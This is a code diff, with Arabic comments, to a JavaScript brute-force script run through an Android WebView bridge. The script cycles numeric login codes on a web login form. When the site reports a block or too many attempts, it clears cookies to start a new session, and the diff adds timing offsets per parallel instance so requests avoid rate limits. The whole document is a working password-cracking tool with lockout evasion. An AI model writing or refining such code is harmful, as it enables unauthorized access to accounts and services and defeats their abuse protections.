@@ -11,6 +11,9 @@
     async function run() {
         log('▶ بدء');
         
+        // تأخير مبدئي إضافي حسب رقم الشاشة لمنع التزامن
+        await new Promise(r => setTimeout(r, id * 500));
+
         const maxVal = Math.pow(10, CFG.digits) - 1;
         let done = 0;
 
@@ -21,7 +24,6 @@
             const btn = document.querySelector('.login-submit') || document.querySelector('button[type="submit"]');
             
             if (!input) {
-                // إذا لم يجد حقل الإدخال، انتظر قليلاً
                 await new Promise(r => setTimeout(r, 1000));
                 continue; 
             }
@@ -43,7 +45,6 @@
 
             const pageText = document.body.innerText;
 
-            // 🚀 السر هنا: عند الحظر، نمسح الجلسة (الكوكيز) ونعيد تحميل الصفحة (جلسة جديدة)
             if (pageText.includes("انت محظور") || pageText.includes("تجاوزت العدد المسموح")) {
                 log('🛑 حظر! مسح الجلسة وتجديد المتصفح...');
                 try { window["AndroidBridge" + id].clearCookies(); } catch(e) {}
@@ -51,7 +52,6 @@
                 return;
             }
 
-            // فحص النجاح
             if (window.location.href.includes("status") || pageText.includes("تم تسجيل الدخول") || pageText.includes("الوقت المتبقي")) {
                 log('✅✅✅ نجاح: ' + v);
                 try { window["AndroidBridge" + id].found(v, pageText); } catch(e) {}
@@ -64,7 +64,10 @@
                 log('📄 ' + errDiv.innerText.trim());
             }
 
-            await new Promise(r => setTimeout(r, CFG.pause || 200));
+            // ✅ السر هنا: ننتظر وقتاً أطول + وقتاً إضافياً حسب رقم الشاشة
+            // هذا يضمن أن كل شاشة ترسل طلبها في وقت مختلف عن الأخرى
+            const dynamicPause = (CFG.pause || 200) + (id * 1000); 
+            await new Promise(r => setTimeout(r, dynamicPause));
         }
         log('❌ انتهى');
         window.__cracking = false;
